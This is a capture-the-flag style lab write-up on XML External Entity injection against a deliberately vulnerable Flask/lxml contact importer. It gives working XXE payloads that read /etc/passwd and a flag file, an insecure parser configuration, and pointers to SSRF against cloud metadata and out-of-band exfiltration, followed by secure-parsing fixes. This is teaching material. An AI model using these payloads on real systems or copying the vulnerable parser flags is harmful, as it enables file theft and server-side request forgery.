# DocuFlow — XML External Entity (XXE) Injection → Local File Read

| | |
|---|---|
| **Vulnerability** | XXE (insecure XML parsing with external-entity resolution) |
| **Impact** | Arbitrary local file read (and, from the same flaw, SSRF / blind OOB exfiltration) |
| **Difficulty** | ★★★½ |
| **Approach** | Black-box |

## Background — what XXE is

XML lets a document declare **entities** (reusable variables) inside a `<!DOCTYPE>`. An *external*
entity can point at a URI, including a local file:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

If the server's XML parser **resolves external entities**, then anywhere the document references
`&xxe;`, the parser substitutes the *contents of that file*. If the app then echoes that value back,
you've read a file off the server.

## The application

DocuFlow imports contacts from an uploaded XML batch and echoes the parsed `name`/`email` back in the
response.

```bash
cd lab19-xxe && pip install flask lxml
echo 'FLAG{xxe_3xt3rn4l_3nt1ty_f1l3_r34d}' | sudo tee /flag.txt && sudo python3 app.py
```

## The sink

```python
parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
root = etree.fromstring(xml, parser)
```

`resolve_entities=True` + `load_dtd=True` tell the parser to process the DTD and expand external
entities — the exact behaviour a hardened parser disables. (Verified live on modern `lxml` 6.1.0:
these explicit flags re-enable XXE even though recent libxml2 defaults are safe.)

## Exploitation

Declare an external entity pointing at the target file, and — critically — **reference it inside a
field the application actually echoes back** (here, `<contact><name>`):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<contacts><contact><name>&xxe;</name><email>x@x</email></contact></contacts>
```
```json
{"ok":true,"imported":1,"contacts":[{"name":"FLAG{xxe_3xt3rn4l_3nt1ty_f1l3_r34d}","email":"x@x"}]}
```

> **The key nuance:** the entity has to land in the app's **reflection sink.** A generic
> `<root>&xxe;</root>` payload resolves the entity just fine, but if the app only reads `<contact>`
> elements, nothing comes back. The vulnerability being present isn't enough — you must route your
> data to a field the app outputs.

**Same flaw, more reach:** swap the URI for `http://169.254.169.254/...` for **SSRF** (e.g. cloud
metadata), or use parameter entities + an external DTD for **blind/out-of-band** exfiltration when
nothing is reflected.

## Root-cause fix

Filtering `SYSTEM`/`file://` strings is a losing game. Two correct approaches:

1. **Don't parse XML if you don't need to.** Contacts are plain data, so accept **JSON** instead —
   no XML parser means no XXE, by construction. (Clean when the format is yours to choose.)
2. **If XML is required** (SAML, SOAP, Office docs), parse it **safely** — use **`defusedxml`**, or an
   `lxml` parser with entity/DTD/network resolution turned off:
   ```python
   parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
   ```

Either way the external entity is never resolved, which kills file read, SSRF, *and* OOB at once.

## Key lesson

Same principle as every injection class: **keep untrusted input as inert data, not something the
engine will act on.** An XML parser that resolves external entities is treating the document as
*instructions* (go read this file / fetch this URL) instead of data — disable that, and the class
disappears.
